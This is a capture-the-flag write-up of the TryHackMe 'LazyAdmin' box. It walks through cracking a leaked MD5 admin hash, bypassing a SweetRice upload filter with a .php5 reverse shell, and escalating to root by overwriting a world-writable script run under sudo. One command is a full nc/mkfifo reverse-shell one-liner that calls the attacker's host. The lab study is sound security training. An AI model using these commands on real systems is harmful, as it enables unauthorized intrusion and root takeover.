Related: [[1. nmap]] | [[sitemap.xmlS]] | [[1.2 Automated Discovery]] | [[Types of shells]] | [[Python]] | [[Brute force]]
Theory: [[File Inclusion]] | [[Command Injection]]

# THM - LazyAdmin

**IP:** `10.112.186.247`  
**LHOST:** `192.168.232.84`  
**Difficulty:** Easy  
**OS:** Linux (Ubuntu)

---

## Open Ports

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.2p2 |
| 80 | HTTP | Apache 2.4.18 |

---

## Enumeration

### Web (Port 80)

Default Apache page on root. Gobuster found `/content/` — SweetRice CMS.

Directory listing enabled on `/content/inc/` — all files browsable and downloadable.

Downloaded everything with:
```bash
wget -r -np -nH --cut-dirs=3 http://10.112.186.247/content/inc/
```

Found `mysql_backup.php` inside `/content/inc/mysql_backup/`.

### Credentials from mysql_backup

The backup file contained a serialised PHP array with the site options INSERT — including:

```
username  →  manager
passwd    →  42f749ade7f9e195bf475f37a44cafcb  (MD5)
```

Cracked MD5 at crackstation.net → `Password123`

Logged into SweetRice admin panel at:
```
http://10.112.186.247/content/as/
```

---

## Foothold

### File Upload Bypass → Reverse Shell

Admin panel file manager at `/content/as/?type=media_center` had an upload function.

`.php` was blocked silently. Bypassed with `.php5` extension.

Uploaded PentestMonkey PHP reverse shell from revshells.com with `.php5` extension, pointed at `192.168.232.84:4444`.

```bash
nc -lvnp 4444
```

Navigated to the uploaded file to trigger it. Got shell as `www-data`.

---

## Privilege Escalation

### sudo → perl → copy.sh → root

```bash
sudo -l
```

```
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

`backup.pl` contents:
```perl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

`/etc/copy.sh` permissions:
```
-rw-r--rwx 1 root root  ← world-writable
```

Overwrote `copy.sh` with our own reverse shell:
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.232.84 5557 >/tmp/f' > /etc/copy.sh
```

Started listener on port 5557, then ran:
```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

Got root shell.

**Why it worked:** sudo runs `backup.pl` as root → `backup.pl` calls `copy.sh` → `copy.sh` is world-writable → we replaced it with our reverse shell → root executes it.

---

## Flags

| Flag | Location |
|------|----------|
| user.txt | `/home/itguy/user.txt` |
| root.txt | `/root/root.txt` |

---

## Key Lessons

- Directory listing + no auth = free file download, always check
- Serialised PHP arrays in DB backups often contain credentials
- MD5 = 32 hex chars — always try crackstation.net first
- `.php` blocked → try `.php5`, `.phtml`, `.phar`
- `sudo -l` immediately after getting a shell
- World-writable file called by a root process = privesc path
